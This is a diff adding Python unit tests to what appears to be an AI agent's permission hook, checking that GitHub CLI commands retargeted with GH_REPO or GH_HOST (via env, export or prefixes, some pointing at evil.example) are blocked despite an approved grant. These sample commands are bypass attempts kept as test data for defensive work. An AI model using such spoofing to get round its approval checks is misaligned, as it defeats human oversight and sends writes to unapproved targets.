@@ -246,6 +246,59 @@ class ExactTargetGrantTests(unittest.TestCase):
         self.assertNotIn('target patterns', text)
 
 
+class GrantBindingEnvSpellingTests(unittest.TestCase):
+    """S53-1 after merging main: every way of setting GH_REPO/GH_HOST rebinds the target."""
+
+    def bash(self, root: Path, command: str) -> tuple[bool, str | None]:
+        return evaluate_pre_tool(root, {'tool_name': 'Bash', 'tool_input': {'command': command}})
+
+    def test_env_wrapper_and_export_do_not_bypass_a_merge_grant(self) -> None:
+        with github_project() as root:
+            add_approval(
+                root, 'production', 'merge #5', 5,
+                actions=['pull-request-merge'], resources=['Dimkox/Getzilla#5'],
+            )
+            self.assertTrue(self.bash(root, 'gh pr merge 5 --squash')[0])
+            for command in (
+                'env GH_REPO=other/x gh pr merge 5',
+                'export GH_REPO=other/x; gh pr merge 5',
+                'export GH_HOST=evil.example && gh pr merge 5',
+                'GH_REPO=other/x; export GH_REPO; gh pr merge 5',
+            ):
+                with self.subTest(command=command):
+                    self.assertFalse(self.bash(root, command)[0], command)
+
+    def test_env_wrapper_and_export_do_not_bypass_an_api_grant(self) -> None:
+        with github_project() as root:
+            add_approval(
+                root, 'external-write', 'one issue', 5, actions=['external-write'],
+                resources=['github-api:POST api.github.com/repos/Dimkox/Getzilla/issues'],
+            )
+            self.assertTrue(self.bash(root, 'gh api repos/Dimkox/Getzilla/issues -f title=x')[0])
+            for command in (
+                'env GH_HOST=evil.example gh api repos/Dimkox/Getzilla/issues -f title=x',
+                'export GH_HOST=evil.example; gh api repos/Dimkox/Getzilla/issues -f title=x',
+            ):
+                with self.subTest(command=command):
+                    self.assertFalse(self.bash(root, command)[0], command)
+
+    def test_generic_gh_write_grant_is_bound_to_the_resolved_repository(self) -> None:
+        with github_project() as root:
+            add_approval(
+                root, 'external-write', 'issue', 5, actions=['external-write'],
+                resources=['gh:. issue create'],
+            )
+            self.assertTrue(self.bash(root, 'gh issue create -t hello -b body')[0])
+            for command in (
+                'GH_REPO=other/x gh issue create -t hello -b body',
+                'env GH_REPO=other/x gh issue create -t hello -b body',
+                'export GH_REPO=other/x; gh issue create -t hello -b body',
+                'GH_HOST=evil.example gh issue create -t hello -b body',
+            ):
+                with self.subTest(command=command):
+                    self.assertFalse(self.bash(root, command)[0], command)
+
+
 class GrantBindingReview2Tests(unittest.TestCase):
     """Round-2 review: env-prefix target spoofing (S53-1) and over-broad push/merge grants (S53-2)."""
 
